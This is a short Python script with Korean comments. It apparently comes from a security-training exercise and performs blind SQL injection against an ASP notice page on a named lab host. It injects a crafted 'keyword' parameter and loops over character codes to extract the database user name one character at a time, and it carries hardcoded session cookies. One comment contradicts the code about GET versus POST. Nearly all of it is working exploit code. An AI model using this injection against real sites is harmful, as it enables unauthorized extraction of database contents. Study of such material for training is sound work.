import requests

url = 'http://elms.skinfosec.co.kr:8081/exam5/notice.asp'
# Cookie 값은 로그인 후 변경 필요
cookie = {'ASPSESSIONIDCACSRTAA': 'FPODDOJCCNFCCBMEBFEEHOCF', 'StudyMode': 'Process', 'ASPEXAMFIXATION': 'pBS4hMqPLfX', 'ContentType': 'C', 'ASPFIXATION': 'NkBjDHll1JU'}

"""
Blind SQL Injection 사전준비
param = {"keyword": "aaa' AND ASCII(substring(user,1,1)) < 130 AND '%1%'='%1"}

Send = requests.get(url, cookies = cookie)
print(Send.status_code)

# Blind True, False Code
if "AAAAAAAAAAAAAAAAAAAAAAAAAAA" in Send.text:
    print(param['keyword'], "True")
else:
    print(param['keyword'], "False")
"""

def find_target():

    find_value = ""

    for i in range(5):
        
        for ascii in range(48, 122):
            param = {"keyword": "aaa' AND ASCII(SUBSTRING(user,{},1)) = {} AND '%1%'='%1".format(i+1, ascii)}
            print(param)
            # GET방식으로 전송하므로 requests.post로 전달해야 한다.
            Send = requests.get(url, params = param, cookies = cookie)
            if "AAAAAAAAAAAAAAAAAAAAAAAAAAA" in Send.text:
                print("user의 값은: ",chr(ascii))
                find_value += chr(ascii)
                break
            print("값을 찾고있습니다!",chr(ascii))
    print("User의 이름은:", find_value, "입니다.")

find_target()
             

        